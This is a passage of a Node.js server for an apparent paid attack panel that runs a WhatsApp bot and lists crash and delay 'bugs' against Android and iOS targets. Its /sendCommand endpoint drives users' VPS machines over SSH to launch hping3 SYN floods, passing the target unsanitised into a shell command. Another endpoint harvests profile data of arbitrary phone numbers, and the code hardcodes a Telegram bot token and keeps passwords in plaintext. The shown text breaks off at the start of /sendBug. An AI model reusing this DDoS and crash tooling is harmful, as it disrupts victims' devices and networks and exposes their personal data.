const telegramConfig = require('./telegram.json');
const originalStdoutWrite = process.stdout.write.bind(process.stdout);
const originalStderrWrite = process.stderr.write.bind(process.stderr);
process.on('SIGINT', () => {
  console.log('[🛑 SIGINT] Server dihentikan manual.');
  process.exit(0);
});

process.stdout.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStdoutWrite(chunk, encoding, callback);
};
process.stderr.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session:') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error:') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStderrWrite(chunk, encoding, callback);
};

const safeExit = process.exit;
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    makeChatsSocket,
    generateProfilePicture,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    encodeWAMessage,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestWaWebVersion,
    templateMessage,
    fetchLatestBaileysVersion,
    InteractiveMessage,    
    Header,
    viewOnceMessage,
    groupStatusMentionMessage,
} = require('@whiskeysockets/baileys');
const express = require("express");
const readline = require("readline");
const crypto = require("crypto");
const app = express();

// FIX: Global CORS untuk semua HTTP requests
app.use(function(req, res, next) {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, x-api-key');
  if (req.method === 'OPTIONS') return res.sendStatus(200);
  next();
});

// FIX: Body parser untuk JSON dan URL-encoded
app.use(require('express').json({ limit: '10mb' }));
app.use(require('express').urlencoded({ extended: true, limit: '10mb' }));
const TelegramBot = require("node-telegram-bot-api");
const fs = require("fs");
const fsPromises = require('fs').promises;
const path = require('path');
const pino = require('pino');
const P = require('pino')
const axios = require('axios')
const vm = require('vm')
const os = require('os');
const WebSocket = require('ws');
const http = require('http');
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });
let wsClients = {};
const { Client } = require('ssh2');
const DB_PATH = "./database.json";
const SESSION_PATH = path.join(__dirname, "permenmd");
const qrCodes = {};
let activeKeys = {};
const KEY_FILE = path.join(__dirname, 'keyList.json');
const bugs = [
//command 
  { bug_id: "delay_hard", bug_name: "𝙳𝙴𝙻𝙰𝚈 𝙷𝙰𝚁𝙳" },
  { bug_id: "freeze", bug_name: "𝙲𝚁𝙰𝚂𝙷 𝚇 𝙷𝙰𝚁𝙳" },
  { bug_id: "crash_android", bug_name: "𝙲𝚁𝙰𝚂𝙷 𝙰𝙽𝙳𝚁𝙾 𝙸𝙾𝚇" },
  { bug_id: "crash_ios", bug_name: "𝙲𝚁𝙰𝚂𝙷 𝙸𝙾𝚂 𝚇 𝙳𝙴𝙻𝙰𝚈" },
  { bug_id: "delay_x_crash", bug_name: "𝙳𝙴𝙻𝙰𝚈 𝚇 𝙲𝚁𝙰𝚂𝙷 𝚄𝙸𝚇" },
];
let cncActive = true;
let vpsList = [];
let vpsConnections = {}
const VPS_FILE = 'vps.json';
let sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
fs.watchFile("keyList.json", () => {
  console.log("[📂] keyList.json changed, reloading...");
  sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
});

function sanitize(input) {
  return String(input)
    .replace(/[<>]/g, '')
    .replace(/[\r\n]/g, ' ')
    .slice(0, 250);
}

// ═══════════════════════════════════════════════════════════════════
// TELEGRAM CONFIG — GANTI 3 NILAI INI SESUAI KEBUTUHANMU
// ═══════════════════════════════════════════════════════════════════
const TG_TOKEN      = "8380866171:AAH5x2t049Kr7D_mj-Hi2SExU52FsPxU2Go";
const TG_MAIN_GROUP = "-1003517973084";   // ← ID group utama (WAJIB)
const TG_GROUP2     = "-1003517973084";                  // ← ID group ke-2 (kosongkan jika tidak pakai)
// ═══════════════════════════════════════════════════════════════════

const TOKEN = TG_TOKEN;
const bot = new TelegramBot(TOKEN, { polling: true });

bot.on('polling_error', (err) => {
  console.error('[TG POLL ERROR]', err.code || '', err.message);
});
bot.on('error', (err) => {
  console.error('[TG ERROR]', err.message);
});

// escMd: return plain string (notif dikirim tanpa Markdown)
function escMd(str) {
  return String(str == null ? '' : str);
}

// stripMd: hapus karakter markdown
function stripMd(str) {
  return String(str == null ? '' : str).replace(/[*_`\[\]~>#]/g, '');
}

// Helper baca telegram.json (untuk bot command ownerList dll)
function readTelegramConfig() {
  try { return JSON.parse(fs.readFileSync(path.join(__dirname, 'telegram.json'), 'utf8')); }
  catch(e) { console.error('[TG CONFIG ERROR]', e.message); return {}; }
}

// ────────────────────────────────────────────────────────────────
// sendTelegramNotif — kirim notif plain text via axios langsung
// TIDAK pakai Markdown agar 100% tidak error karakter spesial
// ────────────────────────────────────────────────────────────────
async function sendTelegramNotif(pesan, parseMode = 'Markdown') {
  // Deduplicate group ID
  const semuaTarget = [...new Set(
    [TG_MAIN_GROUP, TG_GROUP2].filter(id => id && String(id).trim() !== '')
  )];

  if (semuaTarget.length === 0) {
    console.error('[NOTIF ❌] Tidak ada Group ID yang dikonfigurasi!');
    return;
  }

  const pesanStr = String(pesan);

  for (const chatId of semuaTarget) {
    let berhasil = false;

    // Coba kirim dengan Markdown dulu
    try {
      const payload = {
        chat_id: String(chatId).trim(),
        text: pesanStr,
        disable_web_page_preview: true
      };
      if (parseMode) payload.parse_mode = parseMode;

      const resp = await axios.post(
        `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`,
        payload,
        { timeout: 15000 }
      );
      if (resp.data && resp.data.ok) {
        console.log(`[NOTIF ✅] Terkirim ke ${chatId}`);
        berhasil = true;
      }
    } catch (err) {
      // Kalau Markdown gagal (karakter spesial), fallback ke plain text
      console.warn(`[NOTIF ⚠️] Markdown gagal ke ${chatId}, coba plain text...`);
    }

    // Fallback plain text kalau Markdown error
    if (!berhasil) {
      try {
        const pesanBersih = pesanStr.replace(/[*_`\[\]~>#]/g, '');
        const resp2 = await axios.post(
          `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`,
          {
            chat_id: String(chatId).trim(),
            text: pesanBersih,
            disable_web_page_preview: true
          },
          { timeout: 15000 }
        );
        if (resp2.data && resp2.data.ok) {
          console.log(`[NOTIF ✅] Terkirim plain text ke ${chatId}`);
        } else {
          console.error(`[NOTIF ❌] Gagal ke ${chatId}: ${resp2.data && resp2.data.description}`);
        }
      } catch (err2) {
        console.error(`[NOTIF ❌] Error kirim ke ${chatId}: ${err2.message}`);
      }
    }
  }
}

async function appendLogAsync(filePath, data) {
  try {
    if (fs.existsSync(filePath)) {
      const stats = fs.statSync(filePath);
      if (stats.size > 5 * 1024 * 1024) {
        fs.writeFileSync(filePath, '');
      }
    }
    await fsPromises.appendFile(filePath, data);
  } catch (err) {
    console.error(`[❌ LOG ERROR] Gagal menulis log: ${err.message}`);
  }
}


const LOGS_DIR = path.join(__dirname, 'user_logs');

function hapusIsiUserLogs() {
  if (!fs.existsSync(LOGS_DIR)) {
    console.log("[AUTOCLEAN LOGS] Folder tidak ditemukan");
    return;
  }

  const files = fs.readdirSync(LOGS_DIR);

  for (const file of files) {
    const filePath = path.join(LOGS_DIR, file);
    fs.rmSync(filePath, { recursive: true, force: true });
  }

  console.log("[AUTOCLEAN LOGS] Isi folder berhasil dihapus");
}

if (!fs.existsSync(LOGS_DIR)) {
  fs.mkdirSync(LOGS_DIR, { recursive: true });
  console.log("[LOGS] Folder 'user_logs' dibuat.");
}

function saveUserLog(username, type, title, description) {
  try {
    const userLogPath = path.join(LOGS_DIR, `${username}.json`);
    let logs = [];

    if (fs.existsSync(userLogPath)) {
      logs = JSON.parse(fs.readFileSync(userLogPath, 'utf8'));
    }

    logs.push({
      type: type,
      title: title,
      description: description,
      timestamp: Date.now()
    });

    fs.writeFileSync(userLogPath, JSON.stringify(logs, null, 2));
    console.log(`[LOGS] Activity saved for ${username}: ${type}`);
  } catch (err) {
    console.error(`[LOGS] Gagal simpan log ${username}:`, err.message);
  }
}

// FIX: Server-side heartbeat to detect dead connections
const heartbeatInterval = setInterval(function() {
  wss.clients.forEach(function(ws) {
    if (ws.isAlive === false) {
      console.log('[WS] Dead connection terminated');
      return ws.terminate();
    }
    ws.isAlive = false;
    try { ws.ping(); } catch(_) {}
  });
}, 30000); // check every 30 seconds

wss.on('close', function() {
  clearInterval(heartbeatInterval);
});

wss.on('connection', function (ws, req) {
  let username;

  // FIX: Set WS timeout dan error handling
  ws.isAlive = true;
  ws.on('pong', function() { ws.isAlive = true; });

  ws.on('message', function (msg) {
    try {
      const data = JSON.parse(msg);

      if (data.type === 'sessionCheck') {
        const sessionList = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const user = sessionList.find(e => e.sessionKey === data.key);

        if (!user) {
          ws.send(JSON.stringify({
            type: "forceLogout",
            reason: "Invalid key"
          }));
          return ws.close();
        }

        if (user.androidId !== data.androidId) {
          ws.send(JSON.stringify({
            type: "forceLogout",
            reason: "Another device has logged in"
          }));
          return ws.close();
        }
      }

      if (data.type === 'validate') {
        const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const validKey = session.find(e => e.sessionKey === data.key);

        if (!validKey) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "keyInvalid"
          }));
          return ws.close();
        }

        const validUsername = validKey.username;
        // FIX: Selalu kirim myInfo valid=true jika sessionKey cocok, abaikan androidId mismatch
        ws.send(JSON.stringify({
          type: "myInfo",
          valid: true,
          username: validUsername,
          androidId: validKey.androidId,
          role: validKey.role || "member"
        }));

        // FIX: Masukkan ke wsClients agar onlineUsers terhitung dengan benar
        if (validUsername) {
          username = validUsername;
          wsClients[username] = ws;
          // Broadcast onlineCount ke semua client
          const onlineCount = Object.keys(wsClients).length;
          wss.clients.forEach(function(client) {
            if (client.readyState === 1) {
              client.send(JSON.stringify({ type: 'onlineCount', count: onlineCount }));
            }
          });
          // FIX: Langsung kirim stats ke client baru agar totalUsers & onlineUsers langsung muncul
          try {
            const db = JSON.parse(require('fs').readFileSync(require('path').join(__dirname, 'database.json'), 'utf8'));
            ws.send(JSON.stringify({
              type: 'stats',
              totalUsers: db.length,
              onlineUsers: onlineCount
            }));
          } catch(e) {}
        }

        const validateInterval = setInterval(() => {
          const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
          const validKey = session.find(e => e.sessionKey === data.key)
          const validId = session.find(e => e.androidId === data.androidId)

          if (!validKey) {
            clearInterval(validateInterval);
            ws.send(JSON.stringify({
              type: "myInfo",
              valid: false,
              reason: "keyInvalid"
            }));
            return ws.close();
          }

          if (!validId) {
            clearInterval(validateInterval);
            ws.send(JSON.stringify({
              type: "myInfo",
              valid: false,
              reason: "androidIdMismatch"
            }));
            return ws.close();
          }

        }, 10000);
        ws.on('close', () => clearInterval(validateInterval));
      }
      if (data.type === 'auth') {
        username = getUserByKey(data.key);
        console.log('[AUTH] username:', username, 'key:', data.key);
        // FIX: Do NOT close on auth failure — just log warning, allow retry
        if (!username) {
          console.warn('[AUTH] Key not found in keyList:', data.key);
          ws.send(JSON.stringify({ type: 'authFailed', reason: 'Key tidak valid' }));
          return;
        }
        wsClients[username] = ws;
        // FIX: Include role and extra info in authOk response
        const authUserRole = loadKeyList().find(k => k.key === data.key || k.sessionKey === data.key);
        ws.send(JSON.stringify({
          type: 'authOk',
          username,
          role: (authUserRole && authUserRole.role) ? authUserRole.role : 'member'
        }));

        // FIX: Broadcast online count to all clients after new auth
        const onlineCount = Object.keys(wsClients).length;
        wss.clients.forEach(function(client) {
          if (client.readyState === 1) {
            client.send(JSON.stringify({ type: 'onlineCount', count: onlineCount }));
          }
        });
      }

      // ── PING/PONG keepalive ──────────────────────────────────────────────
      if (data.type === 'ping') {
        try { ws.send(JSON.stringify({ type: 'pong' })); } catch(_) {}
        return;
      }

      // ── GET ALL USERS ────────────────────────────────────────────────────
      if (data.type === 'getUsers') {
        try {
          const userMap = {};

          // Add from database first (with role info)
          try {
            const db = JSON.parse(fs.readFileSync(DB_PATH, 'utf8'));
            db.forEach(function(u) {
              if (u.username) {
                userMap[u.username] = { username: u.username, role: u.role || 'member' };
              }
            });
          } catch(dbErr) {
            console.warn('[getUsers] DB read error (non-fatal):', dbErr.message);
          }

          // Add from keyList — may have users not yet in db
          try {
            const keyListRaw = loadKeyList();
            keyListRaw.forEach(function(k) {
              if (k.username) {
                if (!userMap[k.username]) {
                  userMap[k.username] = { username: k.username, role: k.role || 'member' };
                } else if (k.role && userMap[k.username].role === 'member') {
                  // Update role from keyList if more specific
                  userMap[k.username].role = k.role;
                }
              }
            });
          } catch(klErr) {
            console.warn('[getUsers] KeyList read error (non-fatal):', klErr.message);
          }

          const users = Object.values(userMap);
          ws.send(JSON.stringify({ type: 'userList', users: users }));
          console.log('[getUsers] Sent', users.length, 'users to', username);
        } catch(e) {
          console.error('[getUsers] Error:', e.message);
          ws.send(JSON.stringify({ type: 'userList', users: [] }));
        }
      }

      // ── STATS ────────────────────────────────────────────────────────────
      if (data.type === 'stats') {
        try {
          const db = JSON.parse(fs.readFileSync(DB_PATH, 'utf8'));
          // FIX: onlineUsers = jumlah WS client yang benar-benar terkoneksi saat ini
          const onlineUsers = Object.keys(wsClients).length;
          ws.send(JSON.stringify({
            type: 'stats',
            totalUsers: db.length,
            onlineUsers: onlineUsers
          }));
        } catch(e) {
          ws.send(JSON.stringify({ type: 'stats', totalUsers: 0, onlineUsers: 0 }));
        }
      }

    } catch (e) {
      console.error("WS error:", e.message);
    }
  });

  ws.on('close', () => {
    if (username && wsClients[username]) {
      delete wsClients[username];
      // FIX: Broadcast updated online count after disconnect
      const onlineCount = Object.keys(wsClients).length;
      wss.clients.forEach(function(client) {
        if (client.readyState === 1) {
          client.send(JSON.stringify({ type: 'onlineCount', count: onlineCount }));
        }
      });
      console.log('[WS] Disconnected:', username, '| Online:', onlineCount);
    }
  });
});

const wsPort = 10617;
// server.listen is called once at the bottom - do not double-listen here

const PORT = 10617;

app.use(express.urlencoded({ extended: false }));
app.use(express.json());

const rateLimitMap = {};
function rateLimiter(req, res, next) {
  const key = (req.query && req.query.key) || (req.body && req.body.key) || null;
  if (!key) return next();

  const now = Date.now();
  if (!rateLimitMap[key]) rateLimitMap[key] = [];

  rateLimitMap[key] = rateLimitMap[key].filter(ts => now - ts < 1000);
  rateLimitMap[key].push(now);

  if (rateLimitMap[key].length > 2) {
    const db = loadDatabase();
    const user = db.find(u => u.username === (activeKeys[key]?.username || "unknown"));
    console.warn(`[🚫 RATE LIMIT] Token '${key}' (${user?.username || 'unknown'}) melebihi batas 20 req/detik.`);

    return res.status(429).json({
      valid: false,
      rateLimit: true,
      message: "Terlalu banyak permintaan! Maksimal 20 request per detik.",
    });
  }

  next();
}

app.use(rateLimiter);

app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});

if (fs.existsSync(KEY_FILE)) {
  try {
    const rawData = fs.readFileSync(KEY_FILE, 'utf8');
    const parsed = JSON.parse(rawData);

    for (const user of parsed) {
      // FIX: Support both sessionKey and key fields, lastLogin is optional
      const keyVal = user.sessionKey || user.key;
      if (keyVal && user.username) {
        const created = user.lastLogin ? new Date(user.lastLogin).getTime() : Date.now();
        const expires = created + (365 * 24 * 60 * 60 * 1000); // 1 year default

        activeKeys[keyVal] = {
          username: user.username,
          role: user.role || 'member',
          created,
          expires,
        };
        // Also map sessionKey if different from key
        if (user.sessionKey && user.key && user.sessionKey !== user.key) {
          activeKeys[user.key] = activeKeys[keyVal];
        }
      }
    }

    console.log("✅ activeKeys loaded from keyList.json:", Object.keys(activeKeys).length, "keys");
  } catch (err) {
    console.error("❌ Failed to load keyList.json:", err.message);
  }
}

function connectToAllVPS() {
  if (!cncActive) return;

  console.log("🔄 Connecting to all VPS servers...");

  for (const vps of vpsList) {
    if (vpsConnections[vps.host]) {
      console.log(`✅ Already connected to ${vps.host}`);
      continue;
    }

    const conn = new Client();

    conn.on('ready', () => {
      if (!cncActive) {
        conn.end();
        return;
      }

      console.log(`✅ Connected to VPS: ${vps.host}`);
      vpsConnections[vps.host] = conn;

      conn.on('close', () => {
        console.log(`🔌 Disconnected: ${vps.host}`);
        delete vpsConnections[vps.host];

        if (cncActive) {
          console.log(`🔁 Reconnecting to ${vps.host} in 5s...`);
          setTimeout(connectToAllVPS, 5000);
        }
      });
    });

    conn.on('error', (err) => {
      console.log(`❌ Failed to connect to ${vps.host}: ${err.message}`);
    });

    conn.connect({
      host: vps.host,
      username: vps.username,
      password: vps.password,
      readyTimeout: 5000
    });
  }
}

function disconnectAllVPS() {
  console.log("🛑 Disconnecting all VPS connections...");
  cncActive = false;

  for (const host in vpsConnections) {
    vpsConnections[host].end();
    delete vpsConnections[host];
  }
}

if (fs.existsSync(VPS_FILE)) {
  vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
  console.log("📥 VPS list loaded.");
  connectToAllVPS();
}

fs.watch(VPS_FILE, () => {
  try {
    vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
    console.log("🔄 VPS list updated.");
    connectToAllVPS();
  } catch (e) {
    console.error("❌ Failed to update VPS list:", e.message);
  }
});

function getUserByKey(key) {
  try {
    const keyInfo = activeKeys[key] || loadKeyList().find(k => k.key === key || k.sessionKey === key);
    if (!keyInfo || !keyInfo.username) return null;
    // Cache key info for performance
    if (!activeKeys[key]) {
      activeKeys[key] = {
        username: keyInfo.username,
        role: keyInfo.role || 'member',
        created: Date.now(),
        expires: Date.now() + (365 * 24 * 60 * 60 * 1000),
      };
    }
    // FIX: Accept user if found in keyList with valid username
    // No strict DB check — user may exist in keyList but not yet in database.json
    return keyInfo.username;
  } catch(e) {
    console.error('[getUserByKey] Error:', e.message);
    return null;
  }
}

function getUserObjectByKey(key) {
  try {
    const keyInfo = activeKeys[key] || loadKeyList().find(k => k.key === key || k.sessionKey === key);
    if (!keyInfo || !keyInfo.username) return null;
    if (!activeKeys[key]) {
      activeKeys[key] = {
        username: keyInfo.username,
        role: keyInfo.role || 'member',
        created: Date.now(),
        expires: Date.now() + (365 * 24 * 60 * 60 * 1000),
      };
    }
    // Also try to enrich with database.json data
    try {
      const db = JSON.parse(fs.existsSync('./database.json') ? fs.readFileSync('./database.json','utf8')||'[]' : '[]');
      const dbUser = db.find(u => u.username === keyInfo.username);
      if (dbUser) {
        return {
          username: dbUser.username,
          role: (dbUser.role || keyInfo.role || 'member').toLowerCase(),
          pairId: dbUser.pairId || null,
        };
      }
    } catch(_) {}
    return {
      username: keyInfo.username,
      role: (keyInfo.role || 'member').toLowerCase(),
      pairId: null,
    };
  } catch(e) {
    console.error('[getUserObjectByKey] Error:', e.message);
    return null;
  }
}

app.get("/myServer", (req, res) => {
  const key = req.query.key;
  const username = getUserByKey(key);
  if (!username) return res.status(401).json({ error: "Invalid session key" });

  const userVPS = vpsList.filter(vps => vps.owner === username);
  res.json(userVPS);
});

app.post("/addServer", (req, res) => {
  const { key, host, username: sshUser, password } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!host || !sshUser || !password) return res.status(400).json({ error: "Missing fields" });

  const newVPS = { host, username: sshUser, password, owner };
  vpsList.push(newVPS);
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));
  res.json({ success: true, message: "VPS added" });
});

app.post("/delServer", (req, res) => {
  const { key, host } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  const before = vpsList.length;
  vpsList = vpsList.filter(vps => !(vps.host === host && vps.owner === owner));
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));

  const deleted = before !== vpsList.length;
  res.json({ success: deleted, message: deleted ? "VPS deleted" : "VPS not found" });
});

app.post("/sendCommand", (req, res) => {
  const { key, target, port, duration } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!target || !port || !duration) return res.status(400).json({ error: "Missing fields" });

  const userVPS = vpsList.filter(vps => vps.owner === owner);
  if (userVPS.length === 0) return res.status(400).json({ error: "No VPS available for this user" });

  for (const vps of userVPS) {
    const conn = vpsConnections[vps.host];
    if (!conn) {
      console.log(`❌ Not connected to ${vps.host}`);
      continue;
    }

    const command = `screen -dmS hping3 -S --flood ${target} -p ${port}`;
    const killCmd = `sleep ${duration}; pkill screen`;

    conn.exec(`${command} && ${killCmd}`, (err, stream) => {
      if (err) return console.error(`❌ Exec error on ${vps.host}:`, err.message);
      stream.on('close', (code, signal) => {
        console.log(`✅ Command done on ${vps.host} (code: ${code})`);
      });
    });
  }

  res.json({ success: true, message: `Command sent to ${userVPS.length} VPS` });
});

function loadDatabase() {
  if (!fs.existsSync(DB_PATH)) {
    fs.writeFileSync(DB_PATH, JSON.stringify([]));
    console.log("[🗃️ DB] Database baru dibuat.");
  }
  const data = JSON.parse(fs.readFileSync(DB_PATH));
  return data;
}

function saveDatabase(data) {
  fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
}

function generateKey() {
  const key = crypto.randomBytes(8).toString("hex");
  console.log("[🔑 GEN] Key baru dibuat:", key);
  return key;
}

function isExpired(user) {
  const expired = new Date(user.expiredDate) < new Date();
  console.log(`[⏳ EXP] ${user.username} expired:`, expired);
  return expired;
}

app.get("/getInfo", async (req, res) => {
  const { key, number } = req.query;
  const keyInfo = activeKeys[key] || loadKeyList().find(k=>k.key===key||k.sessionKey===key);
  if (!keyInfo) return res.json({ valid: false });

  const bizKeys = Object.keys(biz);
  if (!bizKeys.length) return res.json({ valid: false, message: "No connection" });

  const sock = biz[bizKeys[Math.floor(Math.random() * bizKeys.length)]];
  const jid = number.includes("@") ? number : number + "@s.whatsapp.net";

  try {
    const ppUrl = await sock.profilePictureUrl(jid, 'image').catch(() => null);
    const statusObj = await sock.fetchStatus(jid).catch(() => null);
    const check = await sock.onWhatsApp(number).catch(() => []);
    const info = check[0] || {};

    return res.json({
      valid: true,
      number: number,
      photo: ppUrl || "https://static.vecteezy.com/system/resources/previews/009/292/244/non_2x/default-avatar-icon-of-social-media-user-vector.jpg",
      bio: statusObj?.status || "No bio",
      online: !!statusObj?.lastSeen,
      type: info.biz ? "business" : "personal"
    });
  } catch (err) {
    console.warn("[❌ GETINFO ERROR]", err.message);
    return res.json({ valid: false, message: "Query failed" });
  }
});

const KEY_LIST_FILE = path.join(__dirname, 'keyList.json');

function loadKeyList() {
  try {
    return JSON.parse(fs.readFileSync(KEY_LIST_FILE, 'utf8'));
  } catch {
    return [];
  }
}

function saveKeyList(list) {
  fs.writeFileSync(KEY_LIST_FILE, JSON.stringify(list, null, 2));
}

function recordKey({ username, key, role, ip, androidId }) {
  const list = loadKeyList();
  const stamp = new Date().toISOString();
  const idx = list.findIndex(e => e.username === username);

  if (idx !== -1) {
    list[idx] = { username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId };
  } else {
    list.push({ username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId });
  }

  saveKeyList(list);
}

const news = [
    {
      image: "https://ganga--link--ghhzdp9sv8hk.code.run/i/d1nzz3rf.jpg",
      title: "𝐅𝐎𝐋𝐀𝐗 𝐒𝐘𝐒𝐓𝐄𝐌",
      desc: "𝚃𝙴𝙰𝙼 𝙿𝚁𝙾𝙹𝙴𝙲𝚃 @𝙼𝚛_𝙼𝙵𝙰𝚇 – @𝚔𝚢𝚡𝚜𝚊𝚗𝚌𝚜"
    },
    {
      image: "https://ganga--link--ghhzdp9sv8hk.code.run/i/d1nzz3rf.jpg",
      title: "𝐍𝐄𝐖 𝐏𝐑𝐎𝐉𝐄𝐂𝐓 𝐀𝐏𝐏𝐒",
      desc: "𝙳𝙸 𝙺𝙴𝙼𝙱𝙰𝙽𝙶𝙺𝙰𝙽 𝙾𝙻𝙴𝙷 𝚃𝙴𝙰𝙼 𝙵𝙾𝙻𝙰𝚇"
    }
  ];

app.get("/getMyActivity", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key] || loadKeyList().find(k=>k.key===key||k.sessionKey===key);
  if (!keyInfo) return res.status(401).json({ valid: false, message: "Invalid session key" });

  const username = keyInfo.username;
  const userLogPath = path.join(LOGS_DIR, `${username}.json`);

  try {
    if (!fs.existsSync(userLogPath)) {
      return res.json({ valid: true, activities: [] });
    }

    const logs = JSON.parse(fs.readFileSync(userLogPath, 'utf8'));

    logs.sort((a, b) => b.timestamp - a.timestamp);

    return res.json({ valid: true, activities: logs });
  } catch (err) {
    console.error("[GET LOGS ERROR]", err.message);
    return res.status(500).json({ valid: false, message: "Gagal mengambil log" });
  }
});

app.post("/validate", (req, res) => {
  const { username, password, version, androidId } = req.body;

  if (!androidId) {
    return res.json({ valid: false, message: "androidId required" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);

  if (!user) return res.json({ valid: false });

  if (isExpired(user)) {
    return res.json({ valid: true, expired: true });
  }

  const keyList = loadKeyList();
  const existingSession = keyList.find(e => e.username === username);

  if (existingSession) {
    const oldAndroid = existingSession.androidId;
    const newAndroid = androidId;

    if (oldAndroid !== newAndroid) {
      console.log(`🚫 LOGIN DITOLAK: ${username} | Device Lama: ${oldAndroid} | Device Baru: ${newAndroid}`);

      return res.json({
        valid: false,
        message: "Akun ini sedang login di perangkat lain. Silakan logout terlebih dahulu di perangkat lama."
      });
    }
  }

  const key = generateKey();
  activeKeys[key] = {
    username,
    created: Date.now(),
    expires: Date.now() + 10 * 60 * 1000,
  };

  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId,
  });

  saveUserLog(
    username,
    "login",
    "Login Berhasil",
    `IP: ${req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip} | Device: ${androidId}`
  );

  return res.json({
    valid: true,
    expired: false,
    key,
    expiredDate: user.expiredDate,
    role: user.role || "member",
    listBug: bugs,
    news
  });
});

app.get("/myInfo", (req, res) => {
  const { username, password, androidId, key } = req.query;
  console.log("[ℹ️ INFO] Fetching info for:", username);

  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);
  const keyList = loadKeyList();
  const userKey = keyList.find(k => k.username === username);
  console.log(userKey)

  if (!userKey) {
    console.log("[❌ KEY] Invalid or missing session key.");
    return res.json({ valid: false, reason: "session" });
  }

  if (userKey.androidId !== androidId) {
    console.log("[⚠️ DEVICE] Device mismatch:", userKey.androidId, "!=", androidId);
    return res.json({ valid: false, reason: "device" });
  }

  if (!user) {
    console.log("[❌ INFO] User not found.");
    return res.json({ valid: false });
  }

  if (isExpired(user)) {
    console.log("[⚠️ INFO] User expired.");
    return res.json({ valid: true, expired: true });
  }

  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId
  });

  console.log("[✅ INFO] Info dikirim untuk:", username);

  return res.json({
    valid: true,
    expired: false,
    key,
    username: user.username,
    password: "******",
    expiredDate: user.expiredDate,
    role: user.role || "member",
    listBug: bugs,
    news: news
  });
});

app.post("/changepass", (req, res) => {
  const { username, oldPass, newPass } = req.body;
  if (!username || !oldPass || !newPass) {
    return res.json({ success: false, message: "Incomplete data" });
  }

  const db = loadDatabase();
  const idx = db.findIndex(u => u.username === username && u.password === oldPass);
  if (idx === -1) {
    return res.json({ success: false, message: "Invalid credentials" });
  }

  db[idx].password = newPass;
  saveDatabase(db);

  return res.json({ success: true, message: "Password updated successfully" });
});

app.get("/sendBug", async (req, res) => {
  const { key, bug } = req.query;
  let { target } = req.query;
  const senderMode = req.query.senderMode || 'private';

  const groupRegex = /chat\.whatsapp\.com\/([A-Za-z0-9]+)/;
  const isGroupLink = groupRegex.test(target || '');
  const isGroupJid = typeof target === 'string' && target.endsWith('@g.us');

  if (!isGroupLink && !isGroupJid) {
    target = (target || "").replace(/\D/g, "");
  }

  console.log(`[📤] target=${target} | bug=${bug} | mode=${senderMode}`);

